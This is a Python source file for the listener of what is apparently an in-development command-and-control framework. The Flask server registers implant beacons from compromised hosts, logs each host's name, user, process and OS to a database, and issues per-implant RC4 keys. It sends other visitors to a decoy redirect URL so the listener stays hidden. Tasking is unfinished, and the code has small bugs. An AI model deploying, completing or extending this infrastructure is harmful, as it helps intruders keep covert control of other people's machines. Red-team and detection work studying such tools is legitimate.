import base64
import datetime
import logging
import json
import pymysql
import random
import string
from core.config import *
from core.message import Message
from gevent.wsgi import WSGIServer
from flask import Flask, request, redirect
from logging.handlers import RotatingFileHandler

# creates Flask app
app = Flask(__name__)
app.debug = True


@app.errorhandler(404)
def page_not_found_redirect(error):
    """
    DESCRIPTION:
        This function redirects all 404 requests to "redirect_url"
    """
    return redirect(app.config["redirect_url"])


@app.route("/<path:path>")
def catch_all_redirect(path):
    """
    DESCRIPTION:
        This function redirects all other requests to "redirect_url"
    """
    return redirect(app.config["redirect_url"])


class WebServer(object):

    def __init__(self):
        # tries to open the database connection
        try:
            self.connection = pymysql.connect(host="localhost",
                                              port=3306,
                                              user=username,
                                              passwd=password,
                                              db=database,
                                              autocommit=True)

        # exception raised during database connection
        except Exception:
            raise

    def crypt(self, key, data):
        """
        DESCRIPTION:
            This function is the encryption/decryption routine
        """
        S = list(range(256))
        j = 0
        out = []

        for i in list(range(256)):
            j = (j + S[i] + ord(key[i % len(key)])) % 256
            S[i], S[j] = S[j], S[i]

        i = j = 0

        for char in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(chr(char ^ S[(S[i] + S[j]) % 256]))

        return "".join(out)

    def is_base64(self, string):
        """
        DESCRIPTION:
            This function checks if a specified string is Base64 encoded or not
        """
        # tries to Base64 decode
        try:
            base64.b64decode(string).decode()
            return True

        # exception raised during Base64 decode
        except Exception:
            return False

    def beacon_response(self):
        """
        DESCRIPTION:
            This function is called when an implant beacons
        """
        # if request method is "GET"
        # the implant will never use this method
        # redirects client to the "redirect_url" specified in the profile
        if request.method == "GET":
            return redirect(app.config["redirect_url"])

        # else valid method
        else:
            raw_data = request.get_data()

            # if initial Base64 beacon
            # new beacon
            if self.is_base64(raw_data) is True:
                # Base64 decodes POST data
                decoded = base64.b64decode(raw_data).decode()

                # parses JSON POST data
                j = json.loads(decoded)
                hostname = j["h"]
                operating_system = j["o"]
                process_id = j["p"]
                current_user = j["u"]

                # generates a random 32 character encryption key (upper and lower, no numbers)
                encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))

                # gets current time (uses server's time)
                now = datetime.datetime.now()
                time = now.strftime("%Y-%m-%d %H:%M:%S")

                # adds en entry into the "implants" table
                with self.connection.cursor() as cursor:
                    statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
                    cursor.execute(statement, (hostname,
                                               current_user,
                                               process_id,
                                               operating_system,
                                               time,
                                               encryption_key))

                # returns Base64 encoded encryption key in the HTTP response
                return base64.b64encode(encryption_key.encode())

            # else RC4 beacon
            # previous beacon
            else:
                # queries all encryption keys from the "implants" table
                with self.connection.cursor() as cursor:
                    cursor.execute("SELECT `encryption_key` FROM `implants`")
                    results = cursor.fetchall()

                    # loops through each encryption key
                    # tries to decrypt using each key
                    for row in results:
                        # if successful decryption
                        if "hostname" in self.crypt(row[0], raw_data):
                            # JSON decodes POST data
                            j = json.loads(self.crypt(row[0], raw_data))

                            hostname = j["hostname"]
                            current_user = j["current_user"]
                            process_id = j["process_id"]
                            operating_system = j["operating_system"]

                            # TO DO: check for tasking
                            #       there should be a function in WebServer class called check_tasking(hostname, process_id)
                            #       since we just JSON decoded the POST data above which contains hostname and process_id

                            # DEBUGGING
                            return "decrypted"

    def start_flask(self, protocol, port, profile):
        """
        DESCRIPTION:
            This function starts the Flask web server
        """
        # tries to start the Flask web server
        try:
            # reads profile as a file
            with open(profile) as file:
                j = json.load(file)

            # creates Flask global variable for "redirect_url" due to scoping issues with self
            app.config["redirect_url"] = j["implant"]["redirect_url"]

            # adds beacon route
            app.add_url_rule(j["implant"]["beacon_uri"], None, self.beacon_response, methods=["GET", "POST"])

            # TO DO: add in update route here

            # configures Flask logging with 100 meg max file size
            # all requests are logged to "listener/logs/access.log"
            log_handler = RotatingFileHandler("logs/access.log", maxBytes=100000000, backupCount=3)
            app.logger.addHandler(log_handler)
            app.logger.setLevel(logging.INFO)

            # TO DO: INSERT entry into "listeners" table

            # starts Flask web server
            server = WSGIServer(("0.0.0.0", port), app, log=app.logger)
            Message().display_status("[+] Started listener on tcp/" + str(port))
            server.serve_forever()

        # ignores KeyboardInterrupt exception
        except KeyboardInterrupt:
            pass

        # exception raised starting the Flask web server
        except exception:
            raise

        # deletes all entries from "listeners" table
        # also closes the database connection
        finally:
            with self.connection.cursor() as cursor:
                cursor.execute("DELETE FROM `listeners`")

            if self.connection.open:
                self.connection.close()
